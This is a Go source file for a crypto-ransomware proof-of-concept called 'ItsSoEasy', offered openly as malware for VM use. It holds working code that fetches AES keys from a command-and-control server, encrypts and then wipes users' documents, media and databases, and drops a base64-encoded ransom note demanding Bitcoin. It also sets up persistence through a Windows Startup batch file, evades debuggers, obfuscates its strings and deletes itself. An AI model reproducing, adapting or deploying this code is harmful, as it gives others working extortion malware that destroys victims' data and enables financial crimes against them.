/*
ItsSoEasy -- Crypto-Ransomware Proof-of-Concept

''' ransomware version (Go) '''

What?
This is a Ransomware Concept written in Go. Yes it is malicious. Yes, if you do that on VMs it is okay. Yes,
if you misconfigured the architecture or network and encrypt your own files they are gone forever.

Copyright (c) 2021/2022 Bastian Buck
Contact: https://github.com/bstnbuck

Attention! Use of the code samples and proof-of-concepts shown here is permitted solely at your own risk for academic
        and non-malicious purposes. It is the end user's responsibility to comply with all applicable local, state,
		and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this
        tool and the software in general.
*/

package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// for reverse engineering
// https://acmpxyz.com/go_antidebug.html

// needed for all functions
// https://pkg.go.dev/os

var (
	// Messages for connection with server
	// execCodes
	sendWelcome      = 0
	getKeyAndIVToEnc = 1
	getHasPayed      = 2
	getKeyAndIVToDec = 3
	removeIt         = 4

	// additional
	sucksha = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="                 // well this sucks, ha!
	payd    = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8=" // has this idiot payed the ransom?
	ypay    = "b2gsIHlvdSdyZSBnb29kIQ=="                     // oh, you're good!
	mny     = "bW9uZXksIG1vbmV5LCBtb25leSE="                 // money, money, money!
	hlp     = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"         // i need this to fuck you up!
	kproc   = "LS1LRVktUFJPQ0VEVVJFLS0="                     // --KEY-PROCEDURE--

	// Website content
	websitecontent = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPHRpdGxlPkJvb3RzdHJhcCBFeGFtcGxlPC90aXRsZT4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuNS4yL2Nzcy9ib290c3RyYXAubWluLmNzcyI+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xNi4wL3VtZC9wb3BwZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+Cgo8ZGl2IGNsYXNzPSJqdW1ib3Ryb24gdGV4dC1jZW50ZXIiPgogIDxoMT5JdHNTb0Vhc3khPC9oMT4KICA8cD5XaG9vcHMsIGl0IGxvb2tzIGxpa2UgYWxsIHlvdXIgcGVyc29uYWwgZGF0YSBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBhbiBNaWxpdGFyeSBncmFkZSBlbmNyeXB0aW9uIGFsZ29yaXRobS48L2JyPgpUaGVyZSBpcyBubyB3YXkgdG8gcmVzdG9yZSB5b3VyIGRhdGEgd2l0aG91dCBhIHNwZWNpYWwga2V5LjwvYnI+Ck9ubHkgd2UgY2FuIGRlY3J5cHQgeW91ciBmaWxlcyE8L2JyPgpUbyBwdXJjaGFzZSB5b3VyIGtleSBhbmQgcmVzdG9yZSB5b3VyIGRhdGEsIHBsZWFzZSBmb2xsb3cgdGhlIHRocmVlIGVhc3kgc3RlcHMgYWZ0ZXJ3YXJkcy48L2JyPjwvYnI+CiAgIApXQVJOSU5HOjwvYnI+CkRvIE5PVCBhdHRlbXB0IHRvIGRlY3J5cHQgeW91ciBmaWxlcyB3aXRoIGFueSBzb2Z0d2FyZSBhcyBpdCBpcyBvYnNlbGV0ZSBhbmQgd2lsbCBub3Qgd29yaywgYW5kIG1heSBjb3N0IHlvdSBtb3JlIHRvIHVubG9jayB5b3VyIGZpbGVzLjwvYnI+CkRvIE5PVCBjaGFuZ2UgZmlsZSBuYW1lcywgbWVzcyB3aXRoIHRoZSBmaWxlcywgb3IgcnVuIGRlY2NyeXB0aW9uIHNvZnR3YXJlIGFzIGl0IHdpbGwgY29zdCB5b3UgbW9yZSB0byB1bmxvY2sgeW91ciBmaWxlcy0KLWFuZCB0aGVyZSBpcyBhIGhpZ2ggY2hhbmNlIHlvdSB3aWxsIGxvc2UgeW91ciBmaWxlcyBmb3JldmVyLjwvYnI+CkRvIE5PVCBzZW5kICJQQUlEIiBidXR0b24gd2l0aG91dCBwYXlpbmcsIHByaWNlIFdJTEwgZ28gdXAgZm9yIGRpc29iZWRpZW5jZS48L2JyPgpEbyBOT1QgdGhpbmsgdGhhdCB3ZSB3b250IGRlbGV0ZSB5b3VyIGZpbGVzIGFsdG9nZXRoZXIgYW5kIHRocm93IGF3YXkgdGhlIGtleSBpZiB5b3UgcmVmdXNlIHRvIHBheS4gV0UgV0lMTC4gPC9icj4KICAKICA8L3A+IAo8L2Rpdj4KICAKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBjbGFzcz0iY29sLXNtLTQiPgogICAgICA8aDM+U3RlcCAxPC9oMz4KICAgICAgPHA+RW1haWwgdXMgd2l0aCB0aGUgc3ViamVjdDwvYnI+PGI+ICJJIHdhbnQgbXkgZGF0YSBiYWNrIjwvYj48L2JyPiB0byBHZXRZb3VyRmlsZXNCYWNrQHByb3Rvbm1haWwuY29tPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDI8L2gzPgogICAgICA8cD49PiBZb3Ugd2lsbCByZWNpZXZlIHlvdXIgcGVyc29uYWwgQlRDIGFkZHJlc3MgZm9yIHBheW1lbnQuIFNlbmQgMC4wMSBCVEMgKEJpdGNvaW4pIHRvIHRoaXMgYWRkcmVzcy48L2JyPgogICA9PiBPbmNlIHBheW1lbnQgaGFzIGJlZW4gY29tcGxldGVkLCBzZW5kIGFub3RoZXIgZW1haWwgdG8gR2V0WW91ckZpbGVzQmFja0Bwcm90b25tYWlsLmNvbSBzdGF0aW5nICJQQUlEIi48L2JyPgogICA9PiBXZSB3aWxsIGNoZWNrIHRvIHNlZSBpZiBwYXltZW50IGhhcyBiZWVuIHBhaWQuPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDM8L2gzPiAgICAgICAgCiAgICAgIDxwPlRoZSBwcm9ncmFtIHdpbGwgYXV0b21hdGljYWxseSBjaGVjayBpbiB0aW1lIGludGVydmFscyBpZiB5b3UgaGF2ZSBwYWlkIGFuZCB3aWxsIGRlY3J5cHQgeW91ciBmaWxlcy48L3A+CiAgICAgIDxwPj0+IFRoZXJlZm9yZTogRG8gbm90IGtpbGwgdGhlIHByb2dyYW0gcHJvY2Vzcy4gT3RoZXJ3aXNlIHlvdXIgZGF0YSB3aWxsIGJlIGxvc3QhPC9wPgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg=="
	// Messages
	// tkmsgTitle = "VGhhbmsgeW91IGZvciBnaXZpbmcgbWUgbW9uZXkh"  # Thank you for giving me money!
	tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/" // Decrypt files now?
	// tkmsg1Title = "SXQncyBzbyBlYXN5IQ=="  # It's so easy!
	tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0" // Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
	// tkmsg2Title = "SGEhIFlvdXIgYW4gSWRpb3Q="  // Ha! Your an Idiot
	tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" // Now your data is lost
	// tkmsg3Title = "Q2xldmVyIQ=="  // Clever!
	tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" // It was as easy as I said, ha?

	// Files and directorys
	oser, _   = os.UserHomeDir()
	fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
	ident     = "L2lkZW50aWZpZXI="                                         // /identifier
	ends      = "Lml0c3NvZWFzeQ=="                                         // .itssoeasy

	// chunk size to encrypt, not needed here!
	//datasize = 64 * 1024

	// extensions which will be encrypted https://github.com/deadPix3l/CryptSky/blob/master/discover.py
	extensions = []string{
		// 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  // SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
		"JPEG", "jpg", "bmp", "gif", "png", "svg", "psd", "raw", // images
		"mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape", // music and sound
		"avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp", // Video and movies

		"doc", "docx", "xls", "xlsx", "ppt", "pptx", // Microsoft office
		"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", // OpenOffice, Adobe, Latex, Markdown, etc
		"yml", "yaml", "json", "xml", "csv", // structured data
		"db", "sql", "dbf", "mdb", "iso", // databases and disc images

		"html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", // web technologies

		"zip", "tar", "tgz", "bz2", "7z", "rar", "bak", // compressed formats}
	}
	// connection specific
	hostname = "192.168.56.109:6666"
	//PORT = 6666

	// get path of this executable
	//filePath, _ = os.Executable()
	filePath, _ = os.Executable()
	// get OS, the program runs
	runtimeOS = runtime.GOOS
)

// struct, which stores key and iv
type keyIv struct {
	key []byte
	iv  []byte
}

func runItsSoEasy(debuggerPresent bool) {
	if debuggerPresent {
		doSomeThingElseWithDebugger()
	} else {
		fmt.Println("Welcome to the Google connector!\nPlease wait while the installer runs...")

		notDecrypted := true
		makeAutoRun(false)
		stop := true
		for true {
			if !isEncrypted() {
				userIdentifier := checkUserIdentifier()
				runConnection(sendWelcome, userIdentifier, b64dec(sucksha))
				keyIv := getKey(getKeyAndIVToEnc, userIdentifier, b64dec(hlp))
				encryptData(keyIv)
				createAndShowMessage()
				fmt.Println("Do not destroy the current process, otherwise your data will be irreversibly encrypted.")
			} else if isEncrypted() {
				time.Sleep(30 * time.Second)
				userIdentifier := checkUserIdentifier()
				if stop {
					fmt.Println("Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data.")
					stop = false
				}
				runConnection(sendWelcome, userIdentifier, b64dec(sucksha))
				fmt.Println("If you payed, this window will automatically check and decrypt your data.")
				if isPayed(getHasPayed, userIdentifier, b64dec(payd)) {
					fmt.Println("Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!")
					cId := clientIsIdiot()
					if cId {
						removeAllFiles(cId)
						removeFromServer(removeIt, userIdentifier, b64dec(mny))
						makeAutoRun(true)
					} else {
						for notDecrypted {
							keyIv := getKey(getKeyAndIVToDec, userIdentifier, b64dec(ypay))
							if decryptData(keyIv) {
								removeFromServer(removeIt, userIdentifier, b64dec(mny))
								fmt.Println("Your files has been decrypted!\nThank you and Goodbye.")
								notDecrypted = false
								time.Sleep(2 * time.Second)
							}
						}
						removeAllFiles(cId)
						makeAutoRun(true)
					}
					break
				} else {
					time.Sleep(20 * time.Second)
				}
			}
		}
		selfRemove()
	}
	os.Exit(0)
}

func makeAutoRun(kill bool) {
	if runtimeOS == "windows" {
		userName, _ := user.Current()
		batPath := userName.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
		if kill {
			err := os.Remove(batPath + "\\" + "kill.bat")
			if err != nil {
				fmt.Println("Error while cleaning up: " + err.Error())
				os.Exit(1)
			}
		} else {
			file, _ := os.OpenFile(batPath+"\\"+"kill.bat", os.O_CREATE|os.O_RDWR, 0700)
			_, _ = file.Write([]byte("start \"\" \"" + filePath + "\""))
			err := file.Close()
			if err != nil {
				return
			}
		}
	}
}

// use calls on each OS to open browser
// https://gist.github.com/hyg/9c4afcd91fe24316cbf0
func doSomeThingElseWithDebugger() {
	url := "https://google.de"
	if runtimeOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	} else if runtimeOS == "linux" {
		_ = exec.Command("xdg-open", url).Start()
	}
	selfRemove()
}

// https://gobyexample.com/base64-encoding
func b64dec(toDec string) string {
	sDec, _ := base64.StdEncoding.DecodeString(toDec)
	return string(sDec)
}

func isPayed(exeCode int, userIdentifier, additional string) bool {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", hostname, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(exeCode) + "-!-" + userIdentifier + "-!-" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		err = conn.Close()
		if err != nil {
			return false
		}

		splitted := strings.Split(data, "-!-")
		if splitted[0] == strconv.Itoa(exeCode) && splitted[1] == userIdentifier && splitted[2] == "True" {
			return true
		} else {
			return false
		}
	}
	return false
}

func removeFromServer(exeCode int, userIdentifier, additional string) {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", hostname, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(exeCode) + "-!-" + userIdentifier + "-!-" + additional))
		buf := make([]byte, 1024)
		for true {
			read, _ := conn.Read(buf)
			if read < 1 {
				break
			}
		}
		if err != nil {
			return
		}
		return
	}
	return
}

func isEncrypted() bool {
	filename := oser + b64dec(ident)
	if file, err := os.Open(filename); err == nil {
		defer file.Close()
		scanner := bufio.NewReader(file)
		_, _, _ = scanner.ReadLine()
		isEnc, _, _ := scanner.ReadLine()
		if string(isEnc) == "0" {
			return true
		}
	}
	return false
}

// https://gist.github.com/spikebike/2232102
// https://gist.github.com/denji/12b3a568f092ab951456
// use inbuilt TLS wrapper
func runConnection(exeCode int, userIdentifier, additional string) {
	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", hostname, config)
		if err != nil {
			//fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(exeCode) + "-!-" + userIdentifier + "-!-" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		err = conn.Close()
		if err != nil {
			return
		}

		splitted := strings.Split(data, "-!-")
		if splitted[0] == "OK0" && splitted[1] == "True" {
			return
		} else {
			return
		}
	}
	return
}

// https://eli.thegreenplace.net/2019/aes-encryption-of-files-in-go/
func encryptData(keyIv keyIv) {
	var filesToEncrypt []string
	block, err := aes.NewCipher(keyIv.key)
	if err != nil {
		fmt.Println(err)
	}
	enc := cipher.NewCBCEncrypter(block, keyIv.iv)

	userName, _ := user.Current()
	err = filepath.Walk(userName.HomeDir+"\\testDir", func(path string, info fs.FileInfo, err error) error {
		//err = filepath.Walk(userName.HomeDir+"/testDir", func(path string, info fs.FileInfo, err error) error {
		//err = filepath.Walk("D:\\buckt\\Desktop\\ransomware_code\\go_code\\test", func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			for _, elem := range extensions {
				if filepath.Ext(path)[1:] == elem {
					filesToEncrypt = append(filesToEncrypt, path)
				}
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println(err)
	}

	filename := oser + b64dec(fileFiles)
	oFile, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
	for _, file := range filesToEncrypt {
		_, _ = oFile.Write([]byte(file + "\n"))
	}
	err = oFile.Close()
	if err != nil {
		return
	}

	for _, fileEnc := range filesToEncrypt {
		fi, _ := os.Stat(fileEnc)
		fileSize := fi.Size()

		// https://stackoverflow.com/questions/33851692/golang-bad-file-descriptor
		// write only flag needed here
		outfile, _ := os.OpenFile(fileEnc+b64dec(ends), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0755)

		_, _ = outfile.Write([]byte(strconv.FormatInt(fileSize, 10) + "-!>"))
		for true {
			//data := make([]byte, datasize)

			read, _ := os.ReadFile(fileEnc)
			data := read
			if len(read) == 0 {
				break
			} else if len(read)%16 != 0 {
				//fmt.Println(read)
				data = append(data, bytes.Repeat([]byte(` `), 16-len(read)%16)...)
				//fmt.Println(read)
			}
			encrypted := make([]byte, len(data))
			enc.CryptBlocks(encrypted, data)
			_, _ = outfile.Write(encrypted)
			break
		}
		err := outfile.Close()
		if err != nil {
			return
		}
		content, _ := os.OpenFile(fileEnc, os.O_RDWR, 0755)
		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
		err = content.Close()
		if err != nil {
			return
		}
		_ = os.Remove(fileEnc)
	}
	fl, _ := os.OpenFile(oser+b64dec(ident), os.O_WRONLY|os.O_APPEND, 0755)
	_, _ = fl.Write([]byte("\n0"))
	err = fl.Close()
	if err != nil {
		return
	}

	// clear key and iv value and manually trigger garbage collection
	keyIv.key = nil
	keyIv.iv = nil
	runtime.GC()
	return
}

func decryptData(keyIv keyIv) bool {
	var filesToDecrypt []string
	block, _ := aes.NewCipher(keyIv.key)
	dec := cipher.NewCBCDecrypter(block, keyIv.iv)

	filename := oser + b64dec(fileFiles)

	if ofile, err := os.Open(filename); err == nil {
		scanner := bufio.NewScanner(ofile)
		// line by line
		for scanner.Scan() {
			filesToDecrypt = append(filesToDecrypt, scanner.Text())
		}
		err := ofile.Close()
		if err != nil {
			return false
		}
	}

	for _, fileDec := range filesToDecrypt {
		filein, _ := os.Open(fileDec + b64dec(ends))
		fileSizeReader := bufio.NewReader(filein)
		fSizeStr, _ := fileSizeReader.ReadString('>')
		orgFileSize := int64(0)
		if bytes.HasSuffix([]byte(fSizeStr), []byte("-!>")) {
			orgFileSize, _ = strconv.ParseInt(fSizeStr[:len(fSizeStr)-3], 10, 64)
		}
		err := filein.Close()
		if err != nil {
			return false
		}

		outfile, _ := os.OpenFile(fileDec, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0755)

		for true {
			read, _ := os.ReadFile(fileDec + b64dec(ends))
			//fmt.Println(data)
			read = read[len(fSizeStr):]
			if len(read) == 0 {
				break
			}
			decrypted := make([]byte, len(read))
			dec.CryptBlocks(decrypted, read)
			_, _ = outfile.Write(decrypted)
			break
		}
		err = outfile.Close()
		if err != nil {
			return false
		}
		_ = os.Truncate(fileDec, orgFileSize)

		fi, _ := os.Stat(fileDec + b64dec(ends))
		fileSize := fi.Size()
		content, _ := os.OpenFile(fileDec+b64dec(ends), os.O_RDWR, 0755)
		_, _ = content.Write(bytes.Repeat([]byte(`0`), int(fileSize)))
		err = content.Close()
		if err != nil {
			return false
		}
		_ = os.Remove(fileDec + b64dec(ends))
	}
	//keyIv.key = nil
	//keyIv.iv = nil
	// https://stackoverflow.com/questions/38972003/how-to-stop-the-golang-gc-and-trigger-it-manually
	//runtime.GC()
	return true
}

func checkUserIdentifier() string {
	filename := oser + b64dec(ident)
	var userIdentifier string

	if file, err := os.Open(filename); err == nil {
		scanner := bufio.NewReader(file)
		userId, _, _ := scanner.ReadLine()
		userIdentifier = string(userId)
		err := file.Close()
		if err != nil {
			return ""
		}
	} else {
		err := file.Close()
		if err != nil {
			print("")
		}
		rndm := make([]byte, 64)
		_, _ = rand.Read(rndm)
		userIdentifier = hex.EncodeToString(rndm)
		fileW, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
		_, _ = fileW.Write([]byte(userIdentifier))
		err = fileW.Close()
		if err != nil {
			print("")
		}
	}
	return userIdentifier
}

func getKey(exeCode int, userIdentifier, additional string) keyIv {
	var keyIv keyIv

	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	for true {
		conn, err := tls.Dial("tcp", hostname, config)
		if err != nil {
			fmt.Println(err)
			time.Sleep(2 * time.Second)
			continue
		}

		_, _ = conn.Write([]byte(strconv.Itoa(exeCode) + "-!-" + userIdentifier + "-!-" + additional))
		buf := make([]byte, 1024)
		var data string
		for true {
			read, _ := conn.Read(buf)
			data += string(buf[:read])
			if read < 1 {
				break
			}
		}
		err = conn.Close()
		if err != nil {
			return keyIv
		}

		splitted := strings.Split(data, "-!-")
		splittedKeyIv := strings.Split(splitted[2], b64dec(kproc))
		keyIv.key, _ = hex.DecodeString(splittedKeyIv[0])
		keyIv.iv, _ = hex.DecodeString(splittedKeyIv[1])
		break
	}
	return keyIv
}

func createAndShowMessage() {
	// path separator for each OS / = Linux; \ = Windows
	desktop := oser + string(os.PathSeparator) + "Desktop"
	end := string(os.PathSeparator) + "itssoeasy.html"
	var fileEnd string
	if file, err := os.OpenFile(desktop+end, os.O_CREATE|os.O_RDWR, 0755); err == nil {
		_, _ = file.Write([]byte(b64dec(websitecontent)))
		err := file.Close()
		if err != nil {
			return
		}
		fileEnd = desktop + end
	} else {
		fileA, _ := os.OpenFile(oser+end, os.O_CREATE|os.O_RDWR, 0755)
		_, _ = fileA.Write([]byte(b64dec(websitecontent)))
		err := fileA.Close()
		if err != nil {
			return
		}
		fileEnd = oser + end
	}

	fmt.Println(b64dec(tkmsg1Msg) + " [ENTER]")
	result, _, _ := bufio.NewReader(os.Stdin).ReadRune()
	if result == '\n' {
		if runtimeOS == "windows" {
			_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", fileEnd).Start()
		} else if runtimeOS == "linux" {
			_ = exec.Command("xdg-open", fileEnd).Start()
		}
	}
}

func selfRemove() {
	// trigger self remove
	if runtimeOS == "windows" {
		// with HereItsSoEasy Downloader...
		//base := "C:\\AppData\\"
		base := ""
		if file, err := os.OpenFile(base+"kill.bat", os.O_CREATE|os.O_RDWR, 0755); err == nil {
			_, _ = file.Write([]byte("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\n" +
				"type nul > \"" + filePath + "\"\n" +
				"DEL /q /s \"" + filePath + "\"\n" +
				"type nul > \"" + base + "kill.bat\"\n" +
				"DEL /q /s \"\" + base + \"kill.bat\""))
			err := file.Close()
			if err != nil {
				return
			}
			kill := "C:\\AppData\\kill.bat"
			cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/C", kill)
			_ = cmd.Start()
		}
	}
}

func clientIsIdiot() bool {
	fmt.Print(b64dec(tkmsgMsg) + " y/n: ")
	result, _, _ := bufio.NewReader(os.Stdin).ReadRune()
	if result != 'n' {
		return true
	}
	return false
}

func removeAllFiles(cId bool) {
	filename := oser + b64dec(fileFiles)
	var files []string

	if cId {
		if ofile, err := os.Open(filename); err == nil {
			reader := bufio.NewScanner(ofile)
			for reader.Scan() {
				files = append(files, reader.Text())
			}
			err := ofile.Close()
			if err != nil {
				return
			}

			for _, file := range files {
				fileEnc := file + b64dec(ends)
				fi, _ := os.Stat(fileEnc)
				fsize := fi.Size()
				_ = os.WriteFile(fileEnc, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
				_ = os.Remove(fileEnc)
			}
		}
		idFile := oser + b64dec(ident)
		fi, _ := os.Stat(idFile)
		fsize := fi.Size()
		_ = os.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
		_ = os.Remove(idFile)
		fmt.Println(b64dec(tkmsg2Msg))
	} else {
		idFile := oser + b64dec(ident)
		fi, _ := os.Stat(idFile)
		fsize := fi.Size()
		_ = os.WriteFile(idFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
		_ = os.Remove(idFile)

		fmt.Println(b64dec(tkmsg3Msg))
	}

	fileFile := oser + b64dec(fileFiles)
	fi, _ := os.Stat(fileFile)
	fsize := fi.Size()
	_ = os.WriteFile(fileFile, bytes.Repeat([]byte(`0`), int(fsize)), 0755)
	_ = os.Remove(fileFile)
}

func main() {
	if debuggerPresent() {
		runItsSoEasy(true)
	}
	runItsSoEasy(false)
}
